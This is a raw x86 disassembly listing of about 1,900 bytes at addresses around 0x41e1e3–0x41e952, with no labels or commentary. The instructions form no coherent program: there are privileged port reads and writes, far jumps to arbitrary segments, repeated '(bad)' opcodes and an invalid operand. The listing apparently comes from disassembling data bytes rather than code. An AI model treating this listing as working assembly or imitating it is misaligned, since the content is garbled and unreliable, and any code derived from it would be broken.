  41e1e3:	iret   
  41e1e4:	cmp    eax,0x7434c627
  41e1e9:	not    ebx
  41e1eb:	mov    ch,0xe7
  41e1ed:	xchg   BYTE PTR ds:0xb5b921b8,ah
  41e1f3:	mov    bh,BYTE PTR [esi-0x3cec2fea]
  41e1f9:	rcr    BYTE PTR [ebx+0x7a],1
  41e1fc:	or     ecx,eax
  41e1fe:	es sbb ebp,ebx
  41e201:	mov    ds:0xdf08a568,al
  41e206:	out    dx,al
  41e207:	push   ebp
  41e208:	loope  0x41e269
  41e20a:	push   esp
  41e20b:	and    al,0x61
  41e20d:	adc    al,0x68
  41e20f:	bound  ebp,QWORD PTR [ecx+0x7d11d9ea]
  41e215:	adc    edx,esi
  41e217:	adc    dh,bl
  41e219:	xchg   edx,eax
  41e21a:	push   ebp
  41e21b:	cld    
  41e21c:	ret    
  41e21d:	dec    esi
  41e21e:	fisttp WORD PTR [edx]
  41e220:	bnd jge 0x41e1d3
  41e223:	cmp    DWORD PTR [edx-0x1a],ecx
  41e226:	aam    0x56
  41e228:	mov    al,ds:0x5531e6cf
  41e22d:	ror    ebx,1
  41e22f:	test   al,0x2e
  41e231:	jo     0x41e2ab
  41e233:	mov    ebx,0xbcc034f2
  41e238:	mov    bh,0x38
  41e23a:	rol    DWORD PTR [eax+0x137c51e9],1
  41e240:	sbb    BYTE PTR [ebx+edi*4],cl
  41e243:	or     esi,DWORD PTR [ecx]
  41e245:	inc    ebx
  41e246:	add    DWORD PTR [ebx+0x6f66ffd5],edx
  41e24c:	xchg   esi,eax
  41e24d:	popf   
  41e24e:	rcl    DWORD PTR [edi+0x1911224c],cl
  41e254:	push   edi
  41e255:	aas    
  41e256:	dec    eax
  41e257:	cmp    BYTE PTR [esi*8-0x56a03d9],bh
  41e25e:	inc    esi
  41e25f:	mov    dl,0xcb
  41e261:	shl    esi,cl
  41e263:	inc    edi
  41e264:	push   esi
  41e265:	out    0xf1,al
  41e267:	cmp    cl,ch
  41e269:	repnz outs dx,BYTE PTR ds:[esi]
  41e26b:	out    0x7c,al
  41e26d:	adc    eax,0xf563652c
  41e272:	test   DWORD PTR [edx-0x45],esi
  41e275:	test   bl,bh
  41e277:	js     0x41e1fe
  41e279:	mov    ebp,0xd997cce2
  41e27e:	das    
  41e27f:	lock pop esp
  41e281:	and    esp,DWORD PTR [ebx-0x4b]
  41e284:	pop    es
  41e285:	mov    dh,0x3b
  41e287:	or     dh,BYTE PTR [edx]
  41e289:	mov    edi,0x61fbdd3a
  41e28e:	sub    DWORD PTR [ecx+0x6a72af36],0xffffffa6
  41e295:	xlat   BYTE PTR ds:[ebx]
  41e296:	dec    BYTE PTR [edx+0x2207aded]
  41e29c:	aaa    
  41e29d:	bound  ecx,QWORD PTR [eax-0x4402ef16]
  41e2a3:	cmp    ch,BYTE PTR [eax+0x15]
  41e2a6:	mov    ebx,0x7287e2e4
  41e2ab:	mov    eax,ds:0x9c84f448
  41e2b0:	sub    DWORD PTR [ebx+ebp*2+0x56],ebp
  41e2b4:	push   ecx
  41e2b5:	fnstenv [ebp-0x4cc35427]
  41e2bb:	push   DWORD PTR [ecx+0x0]
  41e2be:	push   0x1c
  41e2c0:	jmp    0xb6cc:0x35f9f07a
  41e2c7:	inc    ebp
  41e2c8:	pop    ebp
  41e2c9:	mov    al,0xde
  41e2cb:	aam    0x76
  41e2cd:	out    dx,eax
  41e2ce:	xchg   ebp,eax
  41e2cf:	stc    
  41e2d0:	cmp    dh,0x7b
  41e2d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2d4:	pop    esp
  41e2d5:	inc    edx
  41e2d6:	loope  0x41e316
  41e2d8:	cmp    eax,0xef61ca55
  41e2dd:	pop    ss
  41e2de:	jmp    0x2ec5:0x189cb911
  41e2e5:	(bad)  
  41e2e6:	rcl    edx,cl
  41e2e8:	test   eax,0xd1646b7c
  41e2ed:	les    eax,FWORD PTR [ebp+0x33b63a76]
  41e2f3:	test   al,0x52
  41e2f5:	push   eax
  41e2f6:	xor    eax,0x6b68d65b
  41e2fb:	add    al,0x32
  41e2fd:	push   es
  41e2fe:	jno    0x41e32f
  41e300:	and    eax,0x6ab4141e
  41e305:	pop    es
  41e306:	sbb    edx,DWORD PTR [ecx+ebx*1-0x14]
  41e30a:	(bad)  
  41e30b:	loop   0x41e346
  41e30d:	dec    edx
  41e30e:	add    BYTE PTR [eax+0x8b1daf5],ah
  41e314:	leave  
  41e315:	inc    ebx
  41e316:	push   ss
  41e317:	or     eax,DWORD PTR ds:0x1eccb59f
  41e31d:	and    bl,BYTE PTR [eax]
  41e31f:	xor    BYTE PTR [ecx],0xa2
  41e322:	mov    DWORD PTR [eax-0x43],edi
  41e325:	iret   
  41e326:	fst    QWORD PTR [ebp+0x57ae23a3]
  41e32c:	pop    esi
  41e32d:	push   edi
  41e32e:	jne    0x41e2b9
  41e330:	xor    BYTE PTR [ebx+0x840e094],cl
  41e336:	push   edx
  41e337:	hlt    
  41e338:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e339:	pushf  
  41e33a:	mov    ch,0xff
  41e33c:	lock and BYTE PTR [ebp+0x644bd71e],0x15
  41e344:	push   ebp
  41e345:	(bad)  
  41e346:	push   0xffffff84
  41e348:	jg     0x41e365
  41e34a:	sub    edi,ebp
  41e34c:	inc    esi
  41e34d:	(bad)  
  41e34e:	lods   al,BYTE PTR ds:[esi]
  41e34f:	addr16 pop edx
  41e351:	jbe    0x41e2e7
  41e353:	push   ecx
  41e354:	inc    edi
  41e355:	fs pusha 
  41e357:	test   al,0xf
  41e359:	(bad)  
  41e35a:	data16 jp 0x41e3b7
  41e35d:	pushf  
  41e35e:	std    
  41e35f:	cmp    al,0x75
  41e361:	push   ebx
  41e362:	inc    edx
  41e363:	shl    BYTE PTR [esi+ebp*4],cl
  41e366:	xor    bh,BYTE PTR [edx+0x70]
  41e369:	rcl    esi,1
  41e36b:	push   DWORD PTR [ecx+0x33b01273]
  41e371:	or     al,BYTE PTR [ecx]
  41e373:	pop    ss
  41e374:	mov    ebx,0xd6d3b8b0
  41e379:	mov    ds:0x326318cd,al
  41e37e:	mov    BYTE PTR [esi+ebp*4+0x7a],dl
  41e382:	adc    bh,dl
  41e384:	pop    ebp
  41e385:	or     al,0x55
  41e387:	repz cmc 
  41e389:	arpl   WORD PTR [eax-0x76],dx
  41e38c:	adc    al,0x11
  41e38e:	je     0x41e3ef
  41e390:	fwait
  41e391:	(bad)  
  41e392:	mov    ?,ebx
  41e394:	fldenv [ebx-0x193095c9]
  41e39a:	add    edx,ecx
  41e39c:	dec    edi
  41e39d:	movups XMMWORD PTR [edi+0x6abe4b52],xmm1
  41e3a4:	pop    edx
  41e3a5:	pop    edx
  41e3a6:	pop    edi
  41e3a7:	jmp    FWORD PTR [esi-0x30]
  41e3aa:	outs   dx,BYTE PTR ds:[esi]
  41e3ab:	jae    0x41e419
  41e3ad:	jbe    0x41e397
  41e3af:	mov    esp,0x7ac8568c
  41e3b4:	xchg   ebx,eax
  41e3b5:	pop    ecx
  41e3b6:	scas   eax,DWORD PTR es:[edi]
  41e3b7:	sbb    bl,BYTE PTR [ebp+0xd]
  41e3ba:	jnp    0x41e385
  41e3bc:	es jecxz 0x41e3fb
  41e3bf:	fmul   st(3),st
  41e3c1:	clc    
  41e3c2:	pop    eax
  41e3c3:	dec    ebx
  41e3c4:	clc    
  41e3c5:	es pusha 
  41e3c7:	call   0xdd45:0xd87713c7
  41e3ce:	jg     0x41e3c6
  41e3d0:	inc    edi
  41e3d1:	out    0x4,al
  41e3d3:	clc    
  41e3d4:	cmp    eax,0x18e9de7a
  41e3d9:	and    dh,0x69
  41e3dc:	shl    BYTE PTR [ebp+0x69f955c5],cl
  41e3e2:	shr    BYTE PTR [ecx+0x45c1ce00],1
  41e3e8:	inc    esi
  41e3e9:	cld    
  41e3ea:	retf   0xd461
  41e3ed:	xor    al,0x62
  41e3ef:	sar    BYTE PTR [esi],0x38
  41e3f2:	retf   
  41e3f3:	push   es
  41e3f4:	pop    DWORD PTR [eax]
  41e3f6:	nop
  41e3f7:	retf   
  41e3f8:	test   eax,0xe80963d
  41e3fd:	and    al,0xde
  41e3ff:	inc    esi
  41e400:	bound  ecx,QWORD PTR [edx+0x1b8aa80a]
  41e406:	retf   0x6b79
  41e409:	in     al,dx
  41e40a:	loopne 0x41e45c
  41e40c:	aas    
  41e40d:	in     eax,0x5a
  41e40f:	pushf  
  41e410:	retf   0x62dc
  41e413:	test   al,0x99
  41e415:	shr    BYTE PTR [ecx-0x30],cl
  41e418:	es mov bh,0xbd
  41e41b:	pop    es
  41e41c:	add    eax,0xfd3050d7
  41e421:	inc    edi
  41e422:	stc    
  41e423:	in     eax,0xc3
  41e425:	dec    ebx
  41e426:	pop    edi
  41e427:	rcl    DWORD PTR [edi+0x13],cl
  41e42a:	enter  0xa38d,0xb6
  41e42e:	out    0x5d,al
  41e430:	pop    ebp
  41e431:	sub    DWORD PTR [edx+0x4a],ecx
  41e434:	call   0x8a9af331
  41e439:	fsub   QWORD PTR ds:0x4f6a7b8d
  41e43f:	in     eax,0x38
  41e441:	pusha  
  41e442:	cli    
  41e443:	cmp    al,0x44
  41e445:	cmp    DWORD PTR [edx-0x39],0x14597d91
  41e44c:	mov    ecx,0x3eaf6ea9
  41e451:	scas   al,BYTE PTR es:[edi]
  41e452:	(bad)  
  41e453:	mov    edx,0xce312c63
  41e458:	sub    eax,0x6007fde8
  41e45d:	loopne 0x41e4bc
  41e45f:	sub    al,0x6c
  41e461:	into   
  41e462:	mov    WORD PTR [edi],ss
  41e464:	std    
  41e465:	pop    esp
  41e466:	fcomp  QWORD PTR [esi-0x32]
  41e469:	imul   edx,DWORD PTR [ebx],0x14
  41e46c:	sub    al,0x4c
  41e46e:	pop    ss
  41e46f:	sbb    bl,BYTE PTR [eax+0x5f]
  41e472:	ja     0x41e4d9
  41e474:	mov    ebp,esi
  41e476:	or     ebp,DWORD PTR [eax-0x10]
  41e479:	cmp    al,0x9d
  41e47b:	pop    ebx
  41e47c:	loop   0x41e4af
  41e47e:	(bad)
  41e482:	xlat   BYTE PTR ds:[ebx]
  41e483:	xor    al,al
  41e485:	sbb    esp,ecx
  41e487:	push   ds
  41e488:	push   cs
  41e489:	mov    eax,ds:0x3fae82df
  41e48e:	mov    eax,0x94f04bd0
  41e493:	xchg   edi,eax
  41e494:	mov    ch,BYTE PTR [ebx]
  41e496:	fdivr  st(3),st
  41e498:	mov    edi,DWORD PTR [esi]
  41e49a:	mov    ah,0xfc
  41e49c:	arpl   WORD PTR [ecx+0x2a],di
  41e49f:	mov    ds:0x118c73eb,al
  41e4a4:	int3   
  41e4a5:	xor    ch,ch
  41e4a7:	sbb    DWORD PTR [edx+0x51d2cefa],ebp
  41e4ad:	jge    0x41e443
  41e4af:	sub    DWORD PTR [ebx-0x32],ecx
  41e4b2:	dec    esp
  41e4b3:	sahf   
  41e4b4:	in     eax,0xf5
  41e4b6:	or     ebx,DWORD PTR [ebx+0x4c]
  41e4b9:	pop    esi
  41e4ba:	jne    0x41e4b4
  41e4bc:	fdiv   DWORD PTR [ecx+0x708d4867]
  41e4c2:	jo     0x41e494
  41e4c4:	stos   BYTE PTR es:[edi],al
  41e4c5:	fdivrp st(2),st
  41e4c7:	ja     0x41e44c
  41e4c9:	dec    eax
  41e4ca:	mov    cl,0x1e
  41e4cc:	fistp  QWORD PTR [edi+0x2c31b692]
  41e4d2:	lahf   
  41e4d3:	addr16 jl 0x41e48b
  41e4d6:	jmp    0x56d59fec
  41e4db:	call   0x2957:0x4c14aa85
  41e4e2:	das    
  41e4e3:	mov    ds:0x40d67983,al
  41e4e8:	push   esi
  41e4e9:	ror    DWORD PTR [edi+0x63],0x9c
  41e4ed:	push   es
  41e4ee:	mov    ds:0x8f328ee2,al
  41e4f3:	xchg   edx,eax
  41e4f4:	not    dh
  41e4f6:	xchg   esp,eax
  41e4f7:	(bad)  
  41e4f8:	pop    edi
  41e4f9:	call   0x33d2:0xdc9e820c
  41e500:	(bad)  
  41e501:	rcr    BYTE PTR [edi],0xf9
  41e504:	ins    DWORD PTR es:[edi],dx
  41e505:	jbe    0x41e583
  41e507:	inc    ebp
  41e508:	data16 in al,0xc6
  41e50b:	mov    esp,DWORD PTR [ebp-0x1]
  41e50e:	pop    ebp
  41e50f:	bound  edi,QWORD PTR [ebx+0x4e]
  41e512:	stos   BYTE PTR es:[edi],al
  41e513:	xor    eax,0xc3e1da16
  41e518:	jmp    eax
  41e51a:	push   edi
  41e51b:	sub    eax,0x69d4cf61
  41e520:	jp     0x41e514
  41e522:	in     eax,0x8c
  41e524:	mov    cl,0xd
  41e526:	call   0xd6ff:0x80b8a7f0
  41e52d:	aad    0x88
  41e52f:	adc    BYTE PTR [esi],al
  41e531:	scas   al,BYTE PTR es:[edi]
  41e532:	pop    ds
  41e533:	into   
  41e534:	mov    eax,0x79d2693d
  41e539:	mov    edx,0x934717c1
  41e53e:	push   ecx
  41e53f:	or     DWORD PTR [edi+esi*4-0x5e3280c0],ebp
  41e546:	arpl   WORD PTR [esi+0x2a],cx
  41e549:	inc    esp
  41e54a:	add    BYTE PTR [edi],al
  41e54c:	push   es
  41e54d:	adc    al,0x7a
  41e54f:	retf   0xf28b
  41e552:	mov    ds:0x617432a1,al
  41e557:	(bad)  
  41e559:	fwait
  41e55a:	aas    
  41e55b:	xchg   edx,eax
  41e55c:	adc    dh,0x9d
  41e55f:	mov    dl,0xff
  41e561:	dec    si
  41e563:	or     al,bl
  41e565:	pop    es
  41e566:	and    BYTE PTR [esi-0x3c768843],dl
  41e56c:	sub    esi,DWORD PTR [edx]
  41e56e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e56f:	test   BYTE PTR [esi],al
  41e571:	jle    0x41e521
  41e573:	gs adc al,0xbb
  41e576:	mov    dh,cl
  41e578:	mov    ds:0xe037b6f1,eax
  41e57d:	neg    DWORD PTR [ecx+0xbd5107b]
  41e583:	inc    ebx
  41e584:	scas   al,BYTE PTR es:[edi]
  41e585:	sub    dl,bh
  41e587:	loop   0x41e5ba
  41e589:	std    
  41e58a:	dec    edx
  41e58b:	(bad)  
  41e58d:	mov    DWORD PTR [ecx-0x5c1b13aa],0xe4cddac0
  41e597:	xchg   ebx,eax
  41e598:	addr16 inc esi
  41e59a:	push   0xffffffbd
  41e59c:	in     al,dx
  41e59d:	push   edx
  41e59e:	into   
  41e59f:	or     al,BYTE PTR [ecx]
  41e5a1:	sub    ch,BYTE PTR [ebp-0x2c]
  41e5a4:	fwait
  41e5a5:	cmp    ecx,DWORD PTR [esi-0x25e5f136]
  41e5ab:	xlat   BYTE PTR ds:[ebx]
  41e5ac:	loop   0x41e53e
  41e5ae:	pop    ebx
  41e5af:	sar    BYTE PTR [edx-0x6d0c5a],cl
  41e5b5:	push   cs
  41e5b6:	add    al,0xc6
  41e5b8:	or     eax,ebx
  41e5ba:	xor    al,0xc9
  41e5bc:	in     eax,0x32
  41e5be:	cwde   
  41e5bf:	pop    ds
  41e5c0:	test   al,0x97
  41e5c2:	and    BYTE PTR [ecx],al
  41e5c4:	or     eax,0x8b88420c
  41e5c9:	inc    edi
  41e5ca:	dec    esi
  41e5cb:	or     eax,0x2dcdafa4
  41e5d0:	dec    esi
  41e5d1:	retf   0x1c44
  41e5d4:	adc    BYTE PTR [ebp+0x6c],dh
  41e5d7:	sbb    ecx,DWORD PTR ds:0xbfda9c26
  41e5dd:	retf   0x6fea
  41e5e0:	stos   BYTE PTR es:[edi],al
  41e5e1:	out    dx,eax
  41e5e2:	test   al,0x6b
  41e5e4:	pop    ebx
  41e5e5:	push   0xffffffb1
  41e5e7:	add    eax,0x3114df5c
  41e5ec:	inc    edx
  41e5ed:	cmp    dl,0x78
  41e5f0:	stos   DWORD PTR es:[edi],eax
  41e5f1:	retf   0x254
  41e5f4:	xchg   edx,eax
  41e5f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5f6:	adc    dh,ah
  41e5f8:	shl    DWORD PTR [ebx+edi*2+0x57],1
  41e5fc:	inc    ebx
  41e5fd:	sub    DWORD PTR [edi+esi*8+0x32],0x53131de5
  41e605:	jno    0x41e62f
  41e607:	mov    ebx,DWORD PTR [ecx*4+0x5af6c2cd]
  41e60e:	rcl    DWORD PTR [ebx],cl
  41e610:	xchg   BYTE PTR [edx-0x40eeeff3],dl
  41e616:	sbb    eax,0x1fffaf5d
  41e61b:	push   0x73d321b1
  41e620:	out    0x76,eax
  41e622:	dec    eax
  41e623:	fld    DWORD PTR [edi]
  41e625:	push   edx
  41e626:	add    eax,0xca06eb07
  41e62b:	mov    esi,DWORD PTR [esi+0x2b]
  41e62e:	xor    edx,esi
  41e630:	aas    
  41e631:	jl     0x41e696
  41e633:	xchg   ebx,eax
  41e634:	outs   dx,DWORD PTR ds:[esi]
  41e635:	mov    ds:0x68ffa070,eax
  41e63a:	rcr    DWORD PTR [ebx],cl
  41e63c:	jg     0x41e6a3
  41e63e:	jle    0x41e635
  41e640:	or     al,0xe8
  41e642:	(bad)  
  41e643:	jmp    0x67a:0x22941a01
  41e64a:	dec    ebx
  41e64b:	mov    cl,0x73
  41e64d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e64e:	pop    esi
  41e64f:	mov    eax,0xa7943a20
  41e654:	push   cs
  41e655:	enter  0xaf4a,0x9e
  41e659:	mov    ebx,0x68139ffa
  41e65e:	jae    0x41e6b8
  41e660:	xchg   BYTE PTR [ecx+0x3f152250],ah
  41e666:	into   
  41e667:	pop    edi
  41e668:	and    eax,eax
  41e66a:	test   BYTE PTR [edx+ecx*4+0x2b],dh
  41e66e:	mov    DWORD PTR [ecx],ebp
  41e670:	sbb    esi,eax
  41e672:	inc    esi
  41e673:	hlt    
  41e674:	adc    eax,0xa80c1695
  41e679:	test   cl,dl
  41e67b:	aam    0x44
  41e67d:	dec    edi
  41e67e:	inc    edi
  41e67f:	ror    DWORD PTR [ebx-0x1bd6ede1],1
  41e685:	mov    eax,ds:0xc948bd84
  41e68a:	(bad)  
  41e68b:	ins    BYTE PTR es:[edi],dx
  41e68c:	retf   
  41e68d:	das    
  41e68e:	mov    al,ds:0xe4495bc
  41e693:	bound  edx,QWORD PTR [esi+0x7f]
  41e696:	xchg   esi,eax
  41e697:	sbb    al,0xd1
  41e699:	jmp    0x41e626
  41e69b:	push   0xffffff98
  41e69d:	jnp    0x41e6cc
  41e69f:	xor    esp,DWORD PTR [esi+0x4ad5ae1e]
  41e6a5:	jnp    0x41e62a
  41e6a7:	out    0x2f,eax
  41e6a9:	es inc edx
  41e6ab:	push   ds
  41e6ac:	arpl   WORD PTR [ecx],di
  41e6ae:	adc    DWORD PTR [edi-0x5aba2aef],0xffffffbb
  41e6b5:	in     al,dx
  41e6b6:	push   ecx
  41e6b7:	js     0x41e6ca
  41e6b9:	or     cl,0x6b
  41e6bc:	jbe    0x41e6c6
  41e6be:	mov    ds:0xa2fa0cc0,al
  41e6c3:	loop   0x41e6be
  41e6c5:	addr16 addr16 jbe 0x41e64e
  41e6c9:	out    dx,eax
  41e6ca:	dec    eax
  41e6cb:	nop
  41e6cc:	stc    
  41e6cd:	pop    ds
  41e6ce:	add    DWORD PTR [ebx],ebx
  41e6d0:	pop    ebp
  41e6d1:	mov    ch,0xec
  41e6d3:	mov    bl,0x39
  41e6d5:	into   
  41e6d6:	cmovnp esp,DWORD PTR [ebx+0x7]
  41e6da:	xor    DWORD PTR [ebp-0x437680be],edi
  41e6e0:	ret    0x31a0
  41e6e3:	or     eax,0x3b0c8a5
  41e6e8:	sbb    al,dl
  41e6ea:	dec    edx
  41e6eb:	push   esi
  41e6ec:	les    edx,FWORD PTR [ebp-0x35]
  41e6ef:	dec    edi
  41e6f0:	mov    edi,0x35b4808e
  41e6f5:	sbb    al,0xa0
  41e6f7:	dec    dh
  41e6f9:	pop    ds
  41e6fa:	fdivr  DWORD PTR [eax+edi*8+0x1225456]
  41e701:	ror    BYTE PTR [ebx+edi*4-0xaf59452],0xe7
  41e709:	or     al,0x95
  41e70b:	mul    BYTE PTR [ecx+0x43]
  41e70e:	sbb    eax,DWORD PTR [ebx+0x4ae5b01b]
  41e714:	retf   0x807c
  41e717:	mov    ebp,DWORD PTR [esp+edi*8+0x56]
  41e71b:	add    ch,BYTE PTR [bp+si+0x3c3e]
  41e720:	and    ebx,ebp
  41e722:	scas   eax,DWORD PTR es:[edi]
  41e723:	rol    BYTE PTR [esi],0x3
  41e726:	dec    edx
  41e727:	fimul  WORD PTR [edi+0x51]
  41e72a:	inc    esp
  41e72b:	mov    ah,0xd6
  41e72d:	fisubr WORD PTR [eax]
  41e72f:	popa   
  41e730:	aam    0x33
  41e732:	shl    BYTE PTR [edx-0x417f9498],0x33
  41e739:	loopne 0x41e6c1
  41e73b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e73c:	or     BYTE PTR [edi+0x7a],0x9
  41e740:	loopne 0x41e6f3
  41e742:	jno    0x41e6d7
  41e744:	outs   dx,DWORD PTR ds:[esi]
  41e745:	imul   ecx,DWORD PTR [ebx+0x601020b3],0xffffffdb
  41e74c:	xchg   edi,eax
  41e74d:	sbb    dh,BYTE PTR [edx]
  41e74f:	xchg   esi,eax
  41e750:	ret    
  41e751:	lods   eax,DWORD PTR ds:[esi]
  41e752:	sbb    BYTE PTR [edi+0x1],dh
  41e755:	inc    edi
  41e756:	mov    esp,0x991111f2
  41e75b:	call   0x142e5d76
  41e760:	jnp    0x41e771
  41e762:	cld    
  41e763:	mov    edi,0xa681996b
  41e768:	(bad)  
  41e769:	jnp    0x41e7df
  41e76b:	int    0xb1
  41e76d:	ret    0xcbe1
  41e770:	push   ss
  41e771:	pop    eax
  41e772:	arpl   WORD PTR [esp+edx*1-0x4f],ax
  41e776:	push   ecx
  41e777:	stos   DWORD PTR es:[edi],eax
  41e778:	scas   eax,DWORD PTR es:[edi]
  41e779:	pushf  
  41e77a:	jp     0x41e7f7
  41e77c:	sub    dh,BYTE PTR [eax+0x6c85010a]
  41e782:	pop    ds
  41e783:	mov    eax,0xf2264c0e
  41e788:	lahf   
  41e789:	fcmovu st,st(0)
  41e78b:	adc    al,0x50
  41e78d:	in     al,dx
  41e78e:	pushf  
  41e78f:	xor    esp,esp
  41e791:	(bad)  
  41e792:	adc    ebx,edx
  41e794:	test   al,0x6c
  41e796:	jno    0x41e77e
  41e798:	div    DWORD PTR [ebp-0x32f283cf]
  41e79e:	lds    edi,FWORD PTR [esi+0x68]
  41e7a1:	xor    al,0xa5
  41e7a3:	pusha  
  41e7a4:	inc    ebp
  41e7a5:	cmp    DWORD PTR ds:0x6947c810,ecx
  41e7ab:	ret    0xcc49
  41e7ae:	cdq    
  41e7af:	addr16 mov dl,0x2a
  41e7b2:	aaa    
  41e7b3:	(bad)  
  41e7b4:	mov    esp,0xf6afc5cd
  41e7b9:	inc    edx
  41e7ba:	dec    ebx
  41e7bb:	rep ins BYTE PTR es:[edi],dx
  41e7bd:	pop    ds
  41e7be:	shr    BYTE PTR [ebx-0xa],1
  41e7c1:	je     0x41e744
  41e7c3:	mov    al,ds:0x8f03cbbc
  41e7c8:	cmp    cl,0xaa
  41e7cb:	pop    eax
  41e7cc:	add    BYTE PTR [ebx],dl
  41e7ce:	or     BYTE PTR [ebp-0x15],0x6f
  41e7d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7d3:	push   ebp
  41e7d4:	pop    esp
  41e7d5:	loope  0x41e7ec
  41e7d7:	retf   0xef6a
  41e7da:	push   edi
  41e7db:	xchg   esi,eax
  41e7dc:	sub    cl,BYTE PTR [edx-0x56]
  41e7df:	inc    edx
  41e7e0:	sub    al,0x1
  41e7e2:	(bad)  
  41e7e4:	pusha  
  41e7e5:	scas   eax,DWORD PTR es:[edi]
  41e7e6:	inc    eax
  41e7e7:	sbb    ah,BYTE PTR [edi-0x22]
  41e7ea:	in     eax,0x80
  41e7ec:	xchg   edx,eax
  41e7ed:	cmp    eax,0x3ccdf47d
  41e7f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7f3:	sub    al,0xd4
  41e7f5:	mov    cl,0xee
  41e7f7:	cwde   
  41e7f8:	adc    DWORD PTR [ebx+eiz*2+0x51],edi
  41e7fc:	inc    esi
  41e7fd:	mov    esi,0x71248170
  41e802:	jmp    0x105:0x44b77e24
  41e809:	pop    ebp
  41e80a:	shl    DWORD PTR [edx-0x5d],cl
  41e80d:	mov    ebx,edi
  41e80f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e810:	ins    BYTE PTR es:[edi],dx
  41e811:	repnz das 
  41e813:	push   ss
  41e814:	call   0xfaabd136
  41e819:	call   0x397ab1d8
  41e81e:	xor    BYTE PTR [ebp+edx*2+0x46],ah
  41e822:	mov    dh,BYTE PTR [ebx]
  41e824:	cmp    ah,bl
  41e826:	in     eax,dx
  41e827:	addr16 inc esi
  41e829:	or     edx,DWORD PTR [eax+0x2e]
  41e82c:	sub    ecx,esp
  41e82e:	add    eax,0x80d32b15
  41e833:	scas   eax,DWORD PTR es:[edi]
  41e834:	cs pop eax
  41e836:	pop    ds
  41e837:	aad    0xb9
  41e839:	add    eax,0x60c42990
  41e83e:	push   edx
  41e83f:	aaa    
  41e840:	rcr    DWORD PTR [ebx+edx*8],1
  41e843:	pop    edi
  41e844:	sub    eax,0x19228b4f
  41e849:	mov    ds:0x7cb00258,eax
  41e84e:	push   edx
  41e84f:	imul   ebx,DWORD PTR [esi],0x5ed4557d
  41e855:	cmp    al,BYTE PTR [ebp-0x4d00808b]
  41e85b:	stos   DWORD PTR es:[edi],eax
  41e85c:	mov    ds:0x4bdd988b,eax
  41e861:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e862:	test   BYTE PTR [esi],ch
  41e864:	inc    ecx
  41e865:	sar    DWORD PTR [eax-0x5b115ed2],1
  41e86b:	sahf   
  41e86c:	dec    eax
  41e86d:	sub    dh,ch
  41e86f:	aad    0x96
  41e871:	clc    
  41e872:	dec    esi
  41e873:	mov    gs,WORD PTR [ebx-0x33cb0bf]
  41e879:	add    DWORD PTR [ecx],edi
  41e87b:	cmp    edx,esi
  41e87d:	outs   dx,DWORD PTR ds:[esi]
  41e87e:	out    dx,eax
  41e87f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e880:	sti    
  41e881:	stos   BYTE PTR es:[edi],al
  41e882:	in     al,dx
  41e883:	or     DWORD PTR [edi+0x8],0xa598a574
  41e88a:	jecxz  0x41e872
  41e88c:	shr    cl,cl
  41e88e:	stos   DWORD PTR es:[edi],eax
  41e88f:	gs and ch,cl
  41e892:	test   BYTE PTR [ebp+0x56],dh
  41e895:	mov    eax,ds:0x97e9ca31
  41e89a:	push   eax
  41e89b:	push   ebx
  41e89c:	dec    ebx
  41e89d:	pop    ebx
  41e89e:	sub    dl,BYTE PTR [esi+eax*4-0x3b897cd5]
  41e8a5:	adc    BYTE PTR [eax],ah
  41e8a7:	mov    ds:0x7d088037,eax
  41e8ac:	add    al,0x47
  41e8ae:	cld    
  41e8af:	dec    esi
  41e8b0:	mov    dh,0x82
  41e8b2:	data16 stc 
  41e8b4:	imul   edx,edi,0x23
  41e8b7:	pop    ebx
  41e8b8:	frstor [edx+0x719f714e]
  41e8be:	sti    
  41e8bf:	xor    BYTE PTR [edi-0x799634c6],dl
  41e8c5:	sbb    DWORD PTR [edx],edi
  41e8c7:	jns    0x41e933
  41e8c9:	adc    dl,BYTE PTR [edx-0x67e49c3c]
  41e8cf:	sub    esi,esp
  41e8d1:	ret    
  41e8d2:	pop    edi
  41e8d3:	les    edx,FWORD PTR [edi+0xb4bd33d]
  41e8d9:	cmc    
  41e8da:	pop    ebp
  41e8db:	test   BYTE PTR [esi-0x37],dh
  41e8de:	fist   WORD PTR [ebp-0x5]
  41e8e1:	jae    0x41e89a
  41e8e3:	or     DWORD PTR [ebp+0x6f1de62c],0x72
  41e8ea:	cmp    al,0xb5
  41e8ec:	jl     0x41e92d
  41e8ee:	outs   dx,BYTE PTR ds:[esi]
  41e8ef:	fisub  DWORD PTR [edx-0x3d5f016]
  41e8f5:	shr    DWORD PTR [edi],cl
  41e8f7:	les    edx,FWORD PTR [eax-0x18c8a8d0]
  41e8fd:	push   0xea749ede
  41e902:	or     ecx,DWORD PTR [edi]
  41e904:	xchg   ecx,eax
  41e905:	test   eax,0xc9684b78
  41e90a:	add    BYTE PTR [ebx-0x3c],bh
  41e90d:	inc    edi
  41e90e:	push   edx
  41e90f:	cmp    ebx,DWORD PTR [esi+0x6d]
  41e912:	pop    ds
  41e913:	nop
  41e914:	or     eax,0x552b08fa
  41e919:	push   es
  41e91a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e91b:	adc    DWORD PTR [edi],eax
  41e91d:	pop    esi
  41e91e:	mov    edi,0xe6578fee
  41e923:	mov    ds:0x75e7d8dd,eax
  41e928:	outs   dx,BYTE PTR ds:[esi]
  41e929:	add    eax,0xc3306026
  41e92e:	mov    WORD PTR [edx],ss
  41e930:	pushf  
  41e931:	loope  0x41e9a4
  41e933:	adc    eax,0xc6f7fec5
  41e938:	iret   
  41e939:	add    al,0xe
  41e93b:	jg     0x41e905
  41e93d:	push   ss
  41e93e:	pop    es
  41e93f:	dec    esi
  41e940:	mov    dl,0x5
  41e942:	lods   eax,DWORD PTR ds:[esi]
  41e943:	test   eax,0x2aed349b
  41e948:	push   eax
  41e949:	jae    0x41e985
  41e94b:	jl     0x41e980
  41e94d:	rol    BYTE PTR [ebx],1
  41e94f:	into   
  41e950:	add    edx,esi
  41e952:	cmp    ecx,edx
